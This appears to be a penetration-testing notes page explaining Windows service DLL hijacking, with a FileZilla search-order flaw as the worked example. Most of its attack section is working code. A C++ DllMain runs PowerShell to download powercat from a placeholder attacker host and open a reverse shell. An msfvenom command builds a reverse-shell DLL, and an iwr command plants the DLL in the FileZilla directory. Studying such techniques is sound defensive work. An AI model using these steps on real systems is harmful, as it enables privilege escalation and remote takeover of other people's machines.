---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Service DLL Hijacking

This attack is similar to "[Service Binary Hijacking](service-binary-hijacking.md)" but instead of replacing the executable, it targets a  [DLL ](https://en.wikipedia.org/wiki/Dynamic-link\_library)the application relies on.

Another approach is hijacking the DLL search order, where Windows looks for the required DLLs in this sequence:

```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. Directories in the PATH environment variable.
```

## Exploiting a Missing DLL

List applications on the machine:

{% code overflow="wrap" %}
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
{% endcode %}

Do some research about an application which is vulnerable to DLL Hijacking.

The following example displays a Service which is vulnerable kind of this attack.

{% embed url="https://www.exploit-db.com/exploits/51267" %}
FileZilla DLL Hijacking Exploit
{% endembed %}

In the example above, the application attempts to load a DLL, but fails to find it in its directory. Instead, `TextShaping.dll` loads from the System directory (2th in the search order).

The following screenshot is from **Procmon**, showing the application's attempt to load `TextShaping.dll` from the The directory from which the application loaded.

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption><p>Procmon DLL attach failed</p></figcaption></figure>

### Attack Path

To exploit this, create a malicious DLL in the FileZilla directory so that when the application looks for the legitimate DLL, it loads the attacker’s version instead, executing malicious code.

### Creating The DLL

Using C++ it is possible to create `DLLMain` function which is responsible to execute code in the DLL life cycle:

{% code title="TextShaping.dll" overflow="wrap" %}
```cpp
#include <windows.h>
#include <string.h>

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	system("powershell -c \"IEX (New-Object System.Net.Webclient).DownloadString('http://<attacker_ip>/powercat.ps1'); powercat -c <attacker_ip> -p <attacker_port> -e powershell\"");
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
```
{% endcode %}

Compile it:

```bash
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
```

Alternatively, use `msfvenom` to generate the DLL:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o TextShaping.dll
```

### Exploiting

Moving the DLL to the target directory:

```powershell
iwr -uri http://<attacker_ip>/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
```

Soon as the DLL will be attached the DLLMain function will execute.

## References

{% embed url="https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order" %}
Dynamic-link library search order
{% endembed %}

{% embed url="https://learn.microsoft.com/en-us/sysinternals/downloads/procmon" %}
Process Monitor
{% endembed %}
